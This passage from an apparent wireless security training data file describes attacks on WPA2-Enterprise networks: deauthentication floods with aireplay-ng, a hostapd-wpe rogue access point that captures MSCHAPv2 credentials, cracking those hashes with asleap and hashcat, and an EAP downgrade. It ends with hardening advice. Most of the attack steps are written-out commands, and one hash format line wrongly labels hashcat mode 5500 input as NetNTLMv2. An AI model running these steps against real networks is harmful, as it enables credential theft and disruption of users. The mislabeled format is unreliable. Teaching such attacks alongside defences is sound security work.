          "hostapd-wpe starts a rogue AP with integrated FreeRADIUS WPE server",
          "When clients connect, the RADIUS server logs MSCHAPv2 challenge/response pairs",
        ],
        tools: ["hostapd-wpe"],
      },
      {
        title: "Force Client Roaming via Deauth",
        steps: [
          "aireplay-ng --deauth 0 -a <target_bssid> wlan0mon",
          "Clients disconnected from the legitimate AP may attempt to reconnect to the same SSID",
          "The rogue AP (same SSID, stronger signal) accepts their connection",
          "If client does not validate server cert, hostapd-wpe captures the full EAP exchange",
        ],
        tools: ["aireplay-ng", "hostapd-wpe"],
      },
      {
        title: "Crack MSCHAPv2 Hashes with asleap",
        steps: [
          "asleap -C <challenge_hex> -R <response_hex> -W /usr/share/wordlists/rockyou.txt",
          "-C is the 8-byte challenge, -R is the 24-byte NT response from hostapd-wpe log",
          "asleap can also process a file: asleap -f captured_hashes.txt -W rockyou.txt",
        ],
        tools: ["asleap"],
      },
      {
        title: "Crack MSCHAPv2 with hashcat (mode 5500)",
        steps: [
          "Convert captured hashes to hashcat format: $NETNTLMv2$<user>$<domain>$<challenge>$<HMAC>$<blob>",
          "hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt",
          "hashcat -m 5500 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
        ],
        tools: ["hashcat"],
      },
      {
        title: "EAP Downgrade Attack (PEAP → MSCHAPv2)",
        steps: [
          "Configure hostapd-wpe to only offer PEAP (Phase 2: MSCHAPv2) and EAP-TTLS (PAP/CHAP/MSCHAPv2)",
          "Remove EAP-TLS from allowed methods in hostapd-wpe.conf",
          "Clients configured for EAP-TLS will fail and may fall back to PEAP-MSCHAPv2",
          "If the client accepts the fallback, credentials are captured in MSCHAPv2 form",
        ],
        tools: ["hostapd-wpe"],
      },
    ],
    tools: ["hostapd-wpe", "asleap", "hashcat", "aireplay-ng", "airodump-ng"],
    hardening: [
      { title: "Enforce Server Certificate Validation", description: "Configure all clients to validate the RADIUS server certificate. On Windows, configure 'Verify the server's identity by validating the certificate' in wireless profile settings. Use eduroam CAT for automated deployment." },
      { title: "Use EAP-TLS with Client Certificates", description: "EAP-TLS provides mutual authentication using client-side certificates. This prevents rogue APs from capturing credentials, as there is no password to harvest. Use an internal PKI for certificate management." },
      { title: "Deploy IEEE 802.1X with Dynamic VLANs", description: "Assign VLANs dynamically based on 802.1X authentication result. A compromised credential only grants access to the assigned VLAN, limiting lateral movement." },
      { title: "Use RADIUS Accounting and Monitoring", description: "Monitor RADIUS authentication logs for failed attempts, unusual login times, and multiple rapid authentication requests — indicators of active EAP relay attacks." },
      { title: "Implement 802.11w (MFP)", description: "Management Frame Protection prevents deauth-based client redirection and improves overall rogue AP detection." },
    ],
    relatedModules: ["evil-twin", "deauth-attacks", "wpa2-psk"],
  },
]
